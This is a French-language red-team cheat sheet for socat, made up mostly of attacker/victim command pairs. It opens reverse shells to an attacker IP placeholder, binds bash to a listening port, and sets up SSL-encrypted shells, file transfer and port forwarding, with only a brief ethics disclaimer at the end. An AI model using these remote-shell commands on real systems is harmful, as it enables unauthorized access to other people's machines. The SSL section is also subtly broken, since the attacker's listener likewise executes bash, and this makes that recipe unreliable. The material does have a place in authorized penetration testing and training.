# 🔗 SOCAT - GUIDE COMPLET RED TEAM

## 📋 INTRODUCTION
`socat` (SOcket CAT) est un outil en ligne de commande qui établit deux flux de données bidirectionnels et transfère les données entre eux. Il peut être vu comme une version beaucoup plus puissante et flexible de Netcat.

### Syntaxe de Base
```bash
socat [OPTIONS] <ADRESSE_1> <ADRESSE_2>
```
`socat` connecte `ADRESSE_1` à `ADRESSE_2`.

### Types d'adresses
- `TCP4:<HOTE>:<PORT>`: Connexion TCP IPv4.
- `TCP-LISTEN:<PORT>`: Attend des connexions TCP.
- `EXEC:<COMMANDE>`: Exécute une commande.
- `FILE:<CHEMIN>`: Lit ou écrit dans un fichier.
- `STDIO`: Utilise l'entrée/sortie standard.
- `OPENSSL-LISTEN:<PORT>`: Attend des connexions chiffrées SSL/TLS.
- `OPENSSL:<HOTE>:<PORT>`: Se connecte à un service SSL/TLS.

## ⚡ REVERSE SHELLS (PLUS STABLES QU'AVEC NETCAT)
Un shell interactif complet (TTY).

- **Machine de l'attaquant (en écoute)**:
  ```bash
  socat file:`tty`,raw,echo=0 tcp-listen:4444
  ```
- **Machine de la victime (se connecte)**:
  ```bash
  socat tcp:<IP_ATTAQUANT>:4444 exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
  ```

## 🛡️ BIND SHELLS
- **Machine de la victime (en écoute)**:
  ```bash
  socat tcp-listen:4444,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
  ```
  *`fork` permet de gérer plusieurs connexions.*
- **Machine de l'attaquant (se connecte)**:
  ```bash
  socat - tcp:<IP_VICTIME>:4444
  ```

## 🚀 TRANSFERT DE FICHIERS
- **Côté réception (en écoute)**:
  ```bash
  socat tcp-listen:4444,reuseaddr file:fichier_recu.dat,create
  ```
- **Côté envoi**:
  ```bash
  socat file:fichier_a_envoyer.dat tcp:<IP_RECEPTION>:4444
  ```

## ⚡ CONNEXIONS CHIFFRÉES (SSL/TLS)
C'est l'un des plus grands avantages de `socat` par rapport à `netcat`.

1.  **Générer un certificat auto-signé sur la machine qui écoute**:
    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
    cat server.key server.crt > server.pem
    ```
2.  **Listener SSL (attaquant)**:
    ```bash
    socat openssl-listen:4444,cert=server.pem,verify=0,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
    ```
3.  **Client SSL (victime)**:
    ```bash
    socat openssl:<IP_ATTAQUANT>:4444,verify=0 exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
    ```
*`verify=0` est nécessaire pour accepter le certificat auto-signé.*

## 🎭 PORT FORWARDING / RELAIS
Rediriger le trafic d'un port local vers une autre machine.
```bash
# Redirige toutes les connexions arrivant sur le port 8080 local vers le port 80 de internal-server.com
socat tcp-listen:8080,reuseaddr,fork tcp:internal-server.com:80
```

## 🎯 AVANTAGES vs NETCAT
- ✅ Chiffrement SSL/TLS natif.
- ✅ Meilleure gestion des shells interactifs (TTY/PTY).
- ✅ Plus de protocoles supportés.
- ✅ Options de `fork` pour gérer plusieurs clients.
- ✅ Logging et debugging plus avancés.

---
> ⚠️ **USAGE ÉTHIQUE** : `socat` est un outil d'administration système puissant qui peut être détourné à des fins malveillantes. Utilisez-le de manière responsable.
